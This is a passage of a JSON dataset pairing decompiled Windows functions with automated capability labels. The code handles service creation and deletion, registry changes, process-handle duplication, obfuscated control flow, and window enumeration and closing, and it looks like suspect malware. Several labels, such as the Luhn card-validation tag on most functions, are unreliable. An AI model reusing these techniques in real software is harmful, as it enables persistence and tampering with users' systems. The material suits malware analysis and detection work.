        "token_count": 448
    },
    "004033f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004033f0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403260(&var_68h, &var_4h);\n    fcn.00401a10(&var_68h, var_4h, 0x411160, 0x13000);\n    *arg_8h = 0x411160;\n    *arg_ch = 0x13000;\n    return;\n}\n",
        "token_count": 239
    },
    "00403470": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403470(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    \n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    uVar1 = fcn.00401440(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 105
    },
    "004034d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004034d0(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00403540": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open registry key",
            "contain loop",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035e3) overlaps instruction at (ram,0x004035e1)\n// \n// WARNING: Removing unreachable block (ram,0x004035cd)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl\nfcn.00403540(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint extraout_ECX;\n    uchar *unaff_EBP;\n    uint unaff_ESI;\n    ushort in_SS;\n    bool bVar3;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_14h;\n    uint var_4h;\n    uint var_1ch;\n    uint uVar4;\n    uint var_4h_2;\n    uchar *puStack4;\n    \n    do {\n        uVar4 = var_8h;\n        var_4h_2 = in_ECX;\n        puStack4 = unaff_EBP;\n        uVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(var_8h, var_ch, 0, 0xf003f, &fcn.00403540::var_4h_2, unaff_ESI);\n        bVar3 = (POPCOUNT(uVar1 & 0xff) & 1U) == 0;\n        if (uVar1 != 0) {\n            return false;\n        }\n        if ((bVar3) || (!bVar3)) goto code_r0x004035ac;\n        segment(in_SS, *0x10 + -0x20);\n        in_ECX = extraout_ECX;\n        unaff_EBP = &stack0xfffffffc;\n        unaff_ESI = 1;\n    } while (bVar3);\n    uVar4 = 0xb7bc9ea5;\ncode_r0x004035ac:\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(var_4h_2, var_10h, 0, var_14h, var_4h, var_1ch, uVar4);\n    var_4h_2 = 0x4035ed;\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    return iVar2 == 0;\n}\n",
        "token_count": 589
    },
    "00403600": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040364b) overlaps instruction at (ram,0x0040364a)\n// \n// WARNING: Removing unreachable block (ram,0x0040364b)\n\nvoid __cdecl fcn.00403600(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uchar *puVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    char *unaff_EBX;\n    uint32_t *unaff_EDI;\n    uint32_t *puVar6;\n    bool bVar7;\n    bool bVar8;\n    bool bVar9;\n    bool bVar10;\n    \n    uVar5 = 0;\n    bVar7 = false;\n    bVar10 = false;\n    bVar8 = arg_14h == 0;\n    uVar4 = arg_14h;\n    if (0 < arg_14h) {\n        do {\n            bVar9 = uVar4 < 0;\n            uVar2 = arg_14h;\n            if ((bVar7 || bVar8) || (!bVar7 && !bVar8)) {\n                unaff_EBX = unaff_EBX & 0xffffff00 | *(uVar5 + arg_10h);\n                uVar4 = arg_14h;\n            }\n            else {\n                uVar5 = uVar5 & 0xffff0000 | CONCAT11((uVar5 >> 8) - *unaff_EBX, uVar5);\n                puVar6 = unaff_EDI + -0x76;\n                puVar1 = *puVar6;\n                *puVar6 = *puVar6 - &stack0xfffffff0;\n                bVar10 = SBORROW1(uVar2, '1') != SBORROW1(uVar2 - 0x31, puVar1 < &stack0xfffffff0);\n                uVar3 = (uVar2 - 0x31) - (puVar1 < &stack0xfffffff0);\n                bVar9 = uVar3 < '\\0';\n                uVar4 = arg_14h & 0xffffff00 | uVar3;\n            }\n            puVar6 = unaff_EDI;\n            if ((bVar10 == bVar9) && (bVar10 != bVar9)) {\n                out(0xc4, uVar4);\n                puVar6 = unaff_EDI + 1;\n                *unaff_EDI = uVar4;\n            }\n            uVar3 = unaff_EBX ^ *(uVar5 % arg_ch + arg_8h);\n            unaff_EBX = unaff_EBX & 0xffffff00 | uVar3;\n            *(uVar5 + arg_10h) = uVar2 ^ uVar3;\n            uVar5 = uVar5 + 1;\n            bVar7 = uVar5 < arg_14h;\n            bVar10 = SBORROW4(uVar5, arg_14h);\n            bVar8 = uVar5 == arg_14h;\n            unaff_EDI = puVar6;\n            uVar4 = uVar5 - arg_14h;\n        } while (uVar5 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 737
    },
    "00403890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004038ed) overlaps instruction at (ram,0x004038e8)\n// \n// WARNING: Removing unreachable block (ram,0x004038c7)\n\nuint fcn.00403890(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    uint arg_8h;\n    uint arg_ch;\n    int32_t iVar2;\n    uint *extraout_ECX;\n    uint *puVar3;\n    ulong uVar4;\n    uint *arg_10h;\n    \n    arg_ch = param_2;\n    arg_8h = param_1;\n    arg_10h = &param_1;\n    uVar4 = fcn.00404660(param_1, param_2, arg_10h, &param_2);\n    iVar2 = uVar4;\n    if (iVar2 != 0) {\n        *(iVar2 + 0x58) = param_2;\n        if ((iVar2 < 1) || (puVar3 = extraout_ECX,  0 < iVar2)) {\n            uVar4 = CONCAT44(&param_2, &param_2);\n            puVar3 = &param_1;\n            arg_10h = puVar3;\n        }\n        puVar1 = uVar4 + 0x8d39da56;\n        *puVar1 = *puVar1 ^ puVar3;\n        puVar1 = (uVar4 | 0x8d) + 0x51;\n        *puVar1 = *puVar1 | param_2;\n        fcn.00404660(arg_8h, arg_ch, arg_10h, uVar4 >> 0x20);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 392
    },
    "00403910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040392c) overlaps instruction at (ram,0x00403928)\n// \n// WARNING: Removing unreachable block (ram,0x004039c2)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403910(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t *in_EDX;\n    uint32_t unaff_EDI;\n    uint16_t in_ES;\n    char in_SF;\n    char in_OF;\n    unkbyte10 in_ST0;\n    uint var_4h;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        *in_EDX = *in_EDX + -0x3397207c;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    iVar1 = fcn.00401d50(0x4241cc);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 != 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(arg_8h, iVar1, 0, 0, 0, 2);\n        iVar3 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)(uVar2);\n        if (iVar3 != 0) {\n            if ((-1 < iVar3) && (-1 >= iVar3)) {\n                uVar2 = uVar2 & 0xffff0000 | in_ES;\n                iVar1 = iVar1 + -1;\n                *(unaff_EDI | &stack0xfffffffc) = iVar3;\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1, uVar2);\n            return 1;\n        }\n        return 0;\n    }\n    return 0;\n}\n",
        "token_count": 475
    },
    "00403ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403ae0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403c00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403c2d) overlaps instruction at (ram,0x00403c2a)\n// \n\nbool fcn.00403c00(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    char cVar3;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    char *pcVar4;\n    int32_t *unaff_ESI;\n    uint32_t unaff_EDI;\n    uint32_t uVar5;\n    bool bVar6;\n    bool bVar7;\n    uint8_t in_AF;\n    ulong uVar8;\n    unkbyte6 Var9;\n    int32_t iStack40;\n    int32_t iStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    iStack40 = param_1;\n    Var9 = (*_sym.imp.MSVCRT.dll__strlwr)();\n    iVar2 = Var9;\n    bVar6 = 0xfffffffb < &iStack40;\n    if ((!SCARRY4(&iStack40, 4)) && (SCARRY4(&iStack40, 4))) {\n        in(Var9 >> 0x20);\n        LOCK();\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iStack24 = 0x424590;\n    uStack20 = 0x424588;\n    uStack16 = 0x424598;\n    uStack12 = 0x4245a0;\n    uStack8 = 0x4245a8;\n    if ((!bVar6) && (bVar6)) {\n        while( true ) {\n            iStack40 = iVar2 + 0x7c8ecb0d + !bVar6;\n            *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x3327e95e;\n            uVar8 = (*_sym.imp.MSVCRT.dll_strstr)(param_1);\n            pcVar4 = uVar8 >> 0x20;\n            iVar2 = uVar8;\n            if (iVar2 != 0) {\n                return true;\n            }\n            uVar5 = unaff_EDI + 1;\n            unaff_ESI = unaff_ESI + 1;\n            bVar6 = uVar5 < 5;\n            bVar7 = (POPCOUNT(unaff_EDI - 4 & 0xff) & 1U) != 0;\n            if (!bVar6) break;\ncode_r0x00403c6e:\n            iVar2 = *unaff_ESI;\n            unaff_EDI = uVar5;\n        }\n        if ((bVar7) && (!bVar7)) {\n            out(*unaff_ESI, uVar8 >> 0x20);\n            do {\n                cVar3 = iVar2 >> 8;\n                in_AF = 9 < (iVar2 & 0xf) | in_AF;\n                iVar2 = CONCAT31(CONCAT21(iVar2 >> 0x10, cVar3 - in_AF), -in_AF);\n            } while (in_AF || cVar3 == *pcVar4);\n            piVar1 = uVar5 + pcVar4 * 2;\n            *piVar1 = (*piVar1 + 0x7b) - in_AF;\n            *(extraout_ECX + 0x68) = iVar2;\n        }\n        iStack40 = param_1;\n        iVar2 = (*_sym.imp.MSVCRT.dll_strstr)();\n        return iVar2 == 0;\n    }\n    bVar6 = false;\n    uVar5 = 0;\n    unaff_ESI = &iStack24;\n    goto code_r0x00403c6e;\n}\n",
        "token_count": 852
    },
    "00403cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00403cd0(int32_t *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t hLibModule;\n    int32_t var_40h;\n    int32_t pbstr;\n    uint var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    uint var_2ch;\n    int32_t *var_28h;\n    int32_t var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4051e0;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)();\n    hLibModule = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    if (hLibModule == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_24h = (*_sym.imp.USER32.dll_RegisterWindowMessageA)();\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(arg_8h, var_24h, 0, 0, 2, 1000, &var_18h);\n    pcVar1 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(hLibModule, 0x424568);\n    if (pcVar1 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar2 = (*pcVar1)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar2 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_28h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n        var_4h._0_1_ = 1;\n        iVar2 = (**(*var_20h + 0x20))(var_20h, &var_28h);\n        if ((iVar2 < 0) || (var_28h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_28h + 0x24))(var_28h, &var_1ch);\n            var_24h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_30h = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_30h = var_30h % var_1ch;\n                    var_38h = CONCAT22(var_38h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                    var_4h._0_1_ = 4;\n                    iVar2 = (**(*var_28h + 0x2c))\n                                      (var_28h, var_38h, var_34h, var_30h, var_2ch, var_38h, var_34h, var_30h, var_2ch, \n                                       &arg_8h);\n                    if ((iVar2 < 0) || (arg_8h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\njoined_r0x004040e8:\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x004040f4:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                        break;\n                    }\n                    iVar2 = (***arg_8h)(arg_8h, 0x4061b0, &var_10h);\n                    if ((iVar2 < 0) || (var_10h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x004040af:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x004040f4;\n                    }\n                    iVar2 = (**(*var_10h + 0x38))(var_10h, &pbstr);\n                    if (iVar2 < 0) {\ncode_r0x00404070:\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\n                        goto joined_r0x004040af;\n                    }\n                    if (pbstr == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 3;\njoined_r0x00403eeb:\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.00403ae0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar3 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x42457c);\n                        if (iVar3 != 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00403eeb;\n                        }\n                        var_14h = NULL;\n    // WARNING: Ignoring partial resolution of indirect\n                        var_4h._0_1_ = 5;\n                        iVar2 = (***arg_8h)(arg_8h, 0x4061a0, &var_14h);\n                        if ((iVar2 < 0) || (var_14h == NULL)) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\njoined_r0x00404094:\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                            goto joined_r0x004040e8;\n                        }\n                        iVar2 = (**(*var_14h + 0x20))(var_14h, &var_40h);\n                        iVar3 = var_40h;\n                        if (iVar2 < 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            goto joined_r0x00404094;\n                        }\n                        if (var_40h == 0) {\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar5 = &var_147h;\n                            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar5 = 0;\n                                puVar5 = puVar5 + 1;\n                            }\n                            *puVar5 = 0;\n                            *(puVar5 + 2) = 0;\n                            fcn.00403ae0(iVar3, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_40h);\n                            iVar3 = fcn.00403c00(&var_148h);\n                            if (iVar3 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n    // WARNING: Ignoring partial resolution of indirect\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto code_r0x00404070;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n    // WARNING: Ignoring partial resolution of indirect\n                            var_4h._0_1_ = 2;\n                        }\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_38h);\n                    var_24h = var_24h + 1;\n                } while (var_24h < var_1ch);\n            }\n    // WARNING: Ignoring partial resolution of indirect\n            var_4h._0_1_ = 0;\n        }\n        if (var_28h != NULL) {\n            (**(*var_28h + 8))(var_28h);\n        }\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(hLibModule);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar2;\n}\n",
        "token_count": 2733
    },
    "004041f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004041f0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x424524);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x404170, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 374
    },
    "004045b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004045b0(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    uint8_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t extraout_ECX;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    bool bVar7;\n    char cVar8;\n    char cVar9;\n    \n    iVar6 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x424254);\n    if (iVar6 == 0) {\n        return 0;\n    }\n    *0x424614 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar6, 0x424264);\n    pcVar3 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    cVar9 = SBORROW4(unaff_EDI, *0x424614);\n    cVar8 = unaff_EDI - *0x424614 < 0;\n    bVar7 = unaff_EDI == *0x424614;\n    *0x424618 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar6, 0x424280);\n    if ((!bVar7 && cVar9 == cVar8) && (bVar7 || cVar9 != cVar8)) {\n        uVar4 = *0x424618;\n        in_AF = 9 < (uVar4 & 0xf) | in_AF;\n        uVar2 = *0x424618 >> 8;\n        uVar1 = *0x424618 & 0xffff0000;\n        if (extraout_ECX == 0) {\n            uVar5 = (*_sym.imp.USER32.dll_RegisterClassExA)();\n            _pe_dos_header = _pe_dos_header + (uVar1 | CONCAT11(uVar2 + in_AF, uVar4 + in_AF * '\\x06') & 0xff0f) + in_AF\n            ;\n            return uVar5;\n        }\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *0x42461c = (*pcVar3)(iVar6, 0x424290);\n    if (((*0x424614 != 0) && (*0x424618 != 0)) && (*0x42461c != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 533
    },
    "00404ea0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404ef9) overlaps instruction at (ram,0x00404ef7)\n// \n// WARNING: Removing unreachable block (ram,0x00404ed6)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __cdecl fcn.00404ea0(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    char cVar6;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t extraout_ECX;\n    char *pcVar7;\n    uint8_t uVar8;\n    bool bVar9;\n    uint8_t in_AF;\n    ulong uVar10;\n    uint32_t in_stack_ffffffbe;\n    \n    puVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    uVar8 = 0;\n    bVar9 = (POPCOUNT(puVar3 & 0xff) & 1U) == 0;\n    if (puVar3 != NULL) {\n        uVar10 = (*_sym.imp.ADVAPI32.dll_DeleteService)(puVar3);\n        pcVar7 = uVar10 >> 0x20;\n        iVar4 = uVar10;\n        iVar5 = iVar4;\n        if ((!bVar9) && (uVar2 = puVar3 << 0x10,  bVar9)) {\n            out(*puVar3, uVar10 >> 0x20);\n            uVar8 = in_AF;\n            do {\n                cVar6 = iVar5 >> 8;\n                uVar8 = 9 < (iVar5 & 0xf) | uVar8;\n                iVar5 = CONCAT31(CONCAT21(iVar5 >> 0x10, cVar6 - uVar8), -uVar8);\n                puVar3 = in_stack_ffffffbe & 0xffff | uVar2;\n            } while (uVar8 || cVar6 == *pcVar7);\n        }\n        piVar1 = iVar4 + pcVar7 * 2;\n        *piVar1 = (*piVar1 + 0x7b) - uVar8;\n        *(extraout_ECX + 0x56) = iVar5;\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(puVar3);\n        return iVar4;\n    }\n    return 0;\n}\n",
        "token_count": 550
    },
    "00401440": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "get service handle",
            "start service"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401440(uint hSCManager, uint lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar3 = (*_sym.imp.ADVAPI32.dll_StartServiceA)(iVar2, 0, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetLastError;\n    if (iVar3 == 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar3 != 0x420) {\n            iVar3 = (*pcVar1)();\n            if (iVar3 != 0x422) {\n                (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                return 0;\n            }\n        }\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n    return 1;\n}\n",
        "token_count": 241
    },
    "00403830": {
        "rules": [
            "contain pusha popa sequence",
            "get service handle",
            "create service"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00403830(uint arg_8h, uint arg_ch, uint hSCObject)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 106
    },
    "004047b0": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.004047b0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x424328, 0x42436c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 79
    }
}